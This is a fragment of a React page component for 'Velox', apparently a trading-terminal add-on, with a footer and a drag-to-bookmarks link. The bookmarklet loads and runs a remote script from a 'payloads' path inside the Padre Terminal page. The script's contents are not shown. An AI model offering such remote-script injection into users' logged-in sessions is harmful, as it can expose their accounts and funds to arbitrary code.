                        <CardTitle className="text-2xl mb-1">Padre Terminal</CardTitle>
                        <p className="text-sm text-gray-400">
                          Bookmark this to capture Terminal market signals and flow.
                        </p>
                      </div>
                    </div>
                  </div>
                  <a
                    href="javascript:(function(){var s=document.createElement('script');s.src='http://localhost:3000/site/payloads/padre-bookmarklet.js';document.body.appendChild(s);})();"
                    data-bookmarklet="padre"
                    className="inline-flex items-center justify-center gap-2 bg-cyan-600/20 hover:bg-cyan-600/30 border border-cyan-500/50 hover:border-cyan-500 text-cyan-300 hover:text-cyan-100 px-6 py-2.5 rounded-lg transition-all duration-300 cursor-grab active:cursor-grabbing font-medium"
                    draggable="true"
                    title="Drag me to your bookmarks bar!"
                    onDragStart={(e) => {
                      const href = (e.currentTarget as HTMLAnchorElement).href;
                      e.dataTransfer?.setData('text/uri-list', href);
                      e.dataTransfer?.setData('text/plain', href);
                    }}
                  >
                    Terminal Bookmarklet
                  </a>
                </CardContent>
              </Card>
            ) : null}
          </div>
        </motion.div>

        {/* Footer */}
        <motion.footer
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
          className="container mx-auto px-4 md:px-8 lg:px-32 pt-20 lg:pt-40 pb-12"
        >
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 border-gray-800 pt-12">
            <div>
              <h3 className="text-lg lg:text-xl font-semibold mb-1">Velox</h3>
              <p className="text-sm lg:text-base text-gray-400 mb-5">
                The #1 Terminal Tool.
              </p>
              <div className="flex flex-wrap gap-4">
                <Link
                  href="https://x.com/veloxtools"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="bg-white/5 border hover:bg-white/10 text-gray-400 hover:text-white p-2 rounded-md transition-colors duration-300"
                >
                  <FaXTwitter size={24} />
                </Link>
                <Link
                  href="https://discord.com/invite/HuXJXB59My"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="bg-white/5 border hover:bg-white/10 text-gray-400 hover:text-white p-2 rounded-md transition-colors duration-300"
                >
                  <FaDiscord size={24} />
                </Link>
              </div>
            </div>
          </div>
          <div className="text-center text-gray-400 mt-12 pt-8 border-t">
            <p className="text-sm lg:text-base">
              &copy; {new Date().getFullYear()} Velox. All rights reserved.
            </p>
          </div>
        </motion.footer>
      </motion.div>
    </main>
  );
}
